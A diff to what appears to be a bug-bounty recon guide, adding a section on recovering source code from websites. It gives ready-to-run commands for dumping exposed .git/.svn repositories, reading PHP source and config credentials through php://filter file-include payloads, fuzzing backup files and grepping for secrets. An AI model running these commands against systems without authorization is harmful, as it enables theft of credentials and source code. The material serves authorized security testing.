@@ -282,7 +282,7 @@ curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x
 | Laravel | Mass assignment ($fillable) | IDOR (Eloquent, no ownership) |
 | Express (Node.js) | Prototype pollution | Path traversal + debug surface (`/_debug`, `/__debug__`) → web2-vuln-classes "Error Disclosure / Debug Endpoints" |
 | Spring Boot | Actuator endpoints → web2-vuln-classes "Error Disclosure / Debug Endpoints" for full surface | SSTI (Thymeleaf) |
-| ASP.NET | ViewState deserialization | Open redirect (ReturnUrl) |
+| ASP.NET | ViewState deserialization (if encrypted, also test padding-oracle path → web2-vuln-classes **Padding Oracle & Crypto Misuse**) | Open redirect (ReturnUrl) |
 | Next.js | SSRF via Server Actions + `/_next/data/` / `/_next/static/chunks/` → web2-vuln-classes "Error Disclosure / Debug Endpoints" | Open redirect via redirect() |
 | GraphQL | Introspection → auth bypass on mutations | IDOR via node(id:) |
 | WordPress | Plugin SQLi | REST API auth bypass |
@@ -391,6 +391,200 @@ gh search code "password" --owner "$TARGET_ORG" --json path,repository 2>/dev/nu
 # GitDorker (if installed):
 python3 ~/tools/GitDorker/GitDorker.py -t GITHUB_TOKEN -d ~/tools/GitDorker/Dorks/alldorksv3 -q "$TARGET" -org
 ```
+
+## SOURCE DISCLOSURE & EXTRACTION
+
+Recovering an app's source code is one of the highest-leverage recon moves: it converts blind black-box hunting into white-box review. A bare directory-listing or exposed file is usually **Low/Info** on its own — it becomes **Medium/High/Critical** the moment the recovered source yields hardcoded secrets, a confirmed injectable sink, or auth logic you can now bypass with certainty.
+
+> Disclosure is not the bug. The bug is what the disclosure *enables*. Always ask: "With this source/config in hand, can I prove a concrete attack RIGHT NOW?" If the dump is empty or contains only public framework code, it's an N/A — kill it.
+
+### Triage scan — fire these against every live host first
+
+```bash
+# One-shot probe of the highest-signal disclosure paths across all live hosts.
+# Only 200s with non-empty bodies are worth a human look.
+for host in $(awk '{print $1}' /tmp/live.txt); do
+  for p in /.git/HEAD /.git/config /.svn/wc.db /.svn/entries /.hg/requires \
+           /.bzr/branch-format /.DS_Store /.env /web.config /WEB-INF/web.xml \
+           /application.properties /config.php.bak /backup.zip /.git/logs/HEAD; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" "$host$p")
+    [ "$code" = "200" ] && echo "[HIT] $code  $host$p"
+  done
+done | tee /tmp/disclosure-hits.txt
+
+# nuclei has curated templates for this — run alongside the manual sweep
+nuclei -l /tmp/live.txt -tags exposure,config,git,backup -severity info,low,medium,high -o /tmp/exposure.txt
+```
+
+### Exposed VCS — dump it, don't just report the 200
+
+A reachable `.git/` (or `.svn/.hg/.bzr`) lets you reconstruct the **entire repo + commit history** — and history is where deleted secrets, old credentials, and removed debug endpoints live. Reporting "`.git/HEAD` returns 200" with no dump is a weak Low; reporting the recovered source + a secret pulled from it is a strong finding.
+
+```bash
+# --- Git (most common) ---
+# git-dumper reconstructs the working tree even when directory listing is OFF.
+pipx install git-dumper   # or: pip install git-dumper
+git-dumper "https://target.com/.git/" /tmp/dump-target
+# Then mine the recovered repo:
+cd /tmp/dump-target
+git log --all --oneline                 # every commit, including reverted ones
+git log -p --all | grep -iE "password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY"
+git show $(git rev-list --all)          # walk objects if checkout is partial
+
+# GitTools (alt) — gitdumper.sh grabs objects, extractor.sh rebuilds commits
+# Useful when git-dumper chokes on a broken index:
+~/tools/GitTools/Dumper/gitdumper.sh "https://target.com/.git/" /tmp/dump-gt
+~/tools/GitTools/Extractor/extractor.sh /tmp/dump-gt /tmp/dump-gt-src
+
+# Quick sanity test before dumping: is the pack/objects tree actually served?
+curl -s "https://target.com/.git/config"            # remote URL → confirms real repo
+curl -s "https://target.com/.git/logs/HEAD"         # ref log → commit SHAs to pull
+
+# --- SVN ---
+# SVN 1.7+ stores everything in a single SQLite DB. Pull it, then read pristine blobs.
+curl -s "https://target.com/.svn/wc.db" -o /tmp/wc.db
+sqlite3 /tmp/wc.db "SELECT local_relpath, checksum FROM NODES;"   # file list + blob hashes
+# Pristine objects live at /.svn/pristine/<2-char>/<sha1>.svn-base
+# SVN ≤1.6 instead exposes /.svn/entries (plaintext file list) + /.svn/text-base/*.svn-base
+# Tooling: svn-extractor / dvcs-ripper rip-svn
+
+# --- Mercurial (.hg) and Bazaar (.bzr) ---
+# Confirm presence then dump with dvcs-ripper:
+curl -s "https://target.com/.hg/requires"           # hg fingerprint
+curl -s "https://target.com/.bzr/branch-format"     # bzr fingerprint
+~/tools/dvcs-ripper/rip-hg.pl  -v -u https://target.com/.hg/
+~/tools/dvcs-ripper/rip-bzr.pl -v -u https://target.com/.bzr/
+```
+
+> If the repo dumps but contains only vendored framework code with no secrets and no app logic, that's an Info disclosure at best. Don't pad your N/A ratio — chain it to a real secret/sink or drop it.
+
+### `.DS_Store` — recursive directory map without brute force
+
+macOS drops a `.DS_Store` in committed folders; deployed to a web root it leaks the exact filenames in each directory. Recurse it to map hidden admin panels, backup files, and source paths that `ffuf` would never guess.
+
+```bash
+# ds_store_exp parses each .DS_Store, then fetches and recurses into the names it finds.
+pip install ds-store           # provides the parser
+python3 ~/tools/ds_store_exp/ds_store_exp.py "https://target.com/.DS_Store"
+# It writes the recovered tree to ./<target>/ — grep it for the good stuff:
+grep -rilE "backup|admin|config|\.sql|\.zip|\.bak|internal|test" ./target.com/
+
+# Manual parse if you only have one file (no listing/recursion):
+curl -s "https://target.com/.DS_Store" -o /tmp/dsstore && strings /tmp/dsstore | sort -u
+# Each readable name is a real sibling file/dir → feed back into the triage scan.
+```
+
+### Backup / temp / swap file fuzzing
+
+Editors and lazy deploys leave shadow copies that bypass the interpreter and serve raw source. `index.php.bak` or `.index.php.swp` returns plaintext PHP that a normal `index.php` request would execute and hide.
+
+```bash
+# Build a candidate list from paths you already know (live URLs + recovered source).
+# Mutate each known file with backup/temp extensions, then ffuf against the host.
+cat /tmp/urls.txt | unfurl paths | sort -u > /tmp/known-paths.txt
+
+# ffuf: fuzz the EXTENSION on a known basename (e.g. config)
+ffuf -u "https://target.com/configFUZZ" \
+     -w <(printf '%s\n' .bak .old .orig .save .swp .swo .tmp .txt '~' .1 .copy .inc .dist .sample) \
+     -mc 200 -ac -t 20
+
+# ffuf: append archive extensions to the bare hostname + common roots (full-site dumps)
+ffuf -u "https://target.com/FUZZ" \
+     -w <(for n in backup bkp www web site app source release dist html public_html "$(echo target)"; do
+            for e in .zip .tar.gz .tar .rar .7z .tgz .sql .sql.gz; do echo "$n$e"; done; done) \
+     -mc 200 -ac -fs 0 -t 20      # -fs 0 drops empty 200s
+
+# Vim swap recovery: .<name>.swp → recover original with vim -r
+curl -s "https://target.com/.index.php.swp" -o /tmp/index.php.swp && vim -r /tmp/index.php.swp
+
+# SecLists has purpose-built lists — prefer them over hand-rolling at scale:
+#   Discovery/Web-Content/BackupFiles.fuzz.txt   (FUZZ-templated, mutates basenames)
+#   Discovery/Web-Content/raft-large-files.txt
+ffuf -u "https://target.com/FUZZ" -w ~/wordlists/SecLists/Discovery/Web-Content/BackupFiles.fuzz.txt \
+     -mc 200 -ac -fs 0 -t 30
+```
+
+### PHP source read — `php://filter` and `.phps`
+
+If you have an LFI / file-include sink (a `?page=`, `?file=`, `?template=` parameter — see the LFI candidates from gf), you can read PHP source instead of executing it by base64-wrapping it through `php://filter`. Recovered source then feeds straight into vuln hunting (find the real RCE/SQLi sink).
+
+```bash
+# Base64-encode the target file so the interpreter returns source, not executed output.
+curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d        # → raw index.php source
+
+# Read config files holding DB creds / API keys (this is what escalates severity):
+curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=config.php" \
+  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
+
+# If allow_url_include is on, php://filter can also chain to RCE — note it, then test
+# carefully under program rules (see SSRF / file-include classes in web2-vuln-classes).
+
+# .phps — some servers map .phps to a syntax-highlighted source view. Try it on every
+# script you can name (no LFI needed):
+curl -s "https://target.com/index.phps" -o /tmp/index.phps   # serves highlighted source
+for f in index config admin login db; do
+  curl -s -o /dev/null -w "%{http_code} $f.phps\n" "https://target.com/$f.phps"
+done
+```
+
+### Env / config leaks — credentials in the open
+
+These files map 1:1 to a payout when they contain live secrets. A bare `.env` listing framework defaults is Info; one with a working DB password, cloud key, or signing secret is High/Critical (verify the key works — see SECRET SCANNING IN JS BUNDLES for verification flow).
+
+| File | Stack | What's inside (escalation) |
+|---|---|---|
+| `/.env` `/.env.local` `/.env.production` | Laravel / Node / Rails | `DB_PASSWORD`, `APP_KEY`, `AWS_*`, `STRIPE_*`, mail creds |
+| `/web.config` `/connectionStrings.config` | ASP.NET / IIS | DB connection strings, machineKey (→ ViewState RCE — see padding-oracle class) |
+| `/WEB-INF/web.xml` `/WEB-INF/classes/*.properties` | Java / Spring | `jdbc.properties`, datasource creds, internal servlet mappings |
+| `/application.properties` `/application.yml` | Spring Boot | DB creds, `management.endpoints` exposure (→ Actuator, see Error Disclosure / Debug Endpoints) |
+| `/config.php` `/wp-config.php` `/configuration.php` | PHP / WP / Joomla | DB creds, auth salts, secret keys |
+| `/appsettings.json` `/secrets.json` | .NET Core | connection strings, JWT signing keys, client secrets |
+| `/.aws/credentials` `/.npmrc` `/.dockercfg` | misc | cloud / registry tokens |
+
+```bash
+# Pull each candidate and immediately scan the body for live-looking secrets.
+for p in /.env /web.config /WEB-INF/web.xml /application.properties /appsettings.json \
+         /config.php /wp-config.php /configuration.php /.git/config; do
+  body=$(curl -s "https://target.com$p")
+  echo "$body" | grep -iqE "password|secret|api[_-]?key|aws|jdbc|connectionstring|begin .*private key" \
+    && echo "[SECRET?] https://target.com$p"
+done
+
+# WEB-INF/web.xml is shielded by the servlet container — usually only reachable via a
+# path-traversal/LFI sink, NOT a direct request. If you can read it, you almost certainly
+# have a traversal bug worth far more than the disclosure itself.
+```
+
+### What to do with recovered source — turn the dump into the bug
+
+Recon hands you the source; the payout comes from the review. Run this on any recovered repo/config:
+
+```bash
+SRC=/tmp/dump-target
+
+# 1) Secrets in tracked files AND in git history (deleted ≠ gone)
+trufflehog filesystem --only-verified "$SRC"
+git -C "$SRC" log -p --all 2>/dev/null | grep -iE "password|secret|api[_-]?key|token|AKIA|-----BEGIN"
+
+# 2) Dangerous sinks → confirm an injectable path, then test it live
+grep -rnE "eval\(|assert\(|system\(|exec\(|popen\(|unserialize\(|pickle\.loads|yaml\.load|Runtime\.exec" "$SRC"
+grep -rnE "(SELECT|INSERT|UPDATE).+\\\$_(GET|POST|REQUEST)|\\.format\(.*request|f\"SELECT" "$SRC"   # SQLi candidates
+grep -rnE "include|require|render_template_string|fopen\(.*\\\$_" "$SRC"                            # LFI / SSTI
+
+# 3) Auth logic you can now bypass with certainty (hardcoded checks, weak JWT secret,
+#    debug flags, default admin creds, IP allowlists, signature verification gaps)
+grep -rniE "debug *= *true|is_admin|jwt.*secret|verify=False|disable.*auth|backdoor|TODO|FIXME" "$SRC"
+
+# 4) Internal hostnames / endpoints not in your URL list → new attack surface (+ SSRF targets)
+grep -rohE "https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/[^\"' ]*)?" "$SRC" | sort -u
+```
+
+> Severity ladder for a report: `path returns 200` = Info → `recovered full source` = Low → `+ verified secret OR confirmed exploitable sink (SQLi/RCE/auth bypass)` = High/Critical. Submit at the top of the ladder you can *prove*, never the bottom.
+
+**Pattern seen on HackerOne / Bugcrowd:** exposed `.git` directories dumped to full source, then mined for hardcoded credentials in commit history → account takeover / admin access (e.g. the U.S. DoD `.git` exposure report, hackerone.com/reports/1624157). `.DS_Store` recursion has paid out for revealing backup archives and debug-mode internal panels that direct fuzzing missed. Do not invent dollar figures — frame the impact, prove the chain, and let the program set the bounty.
+
+---
 
 ## 30-MINUTE RECON PROTOCOL
 
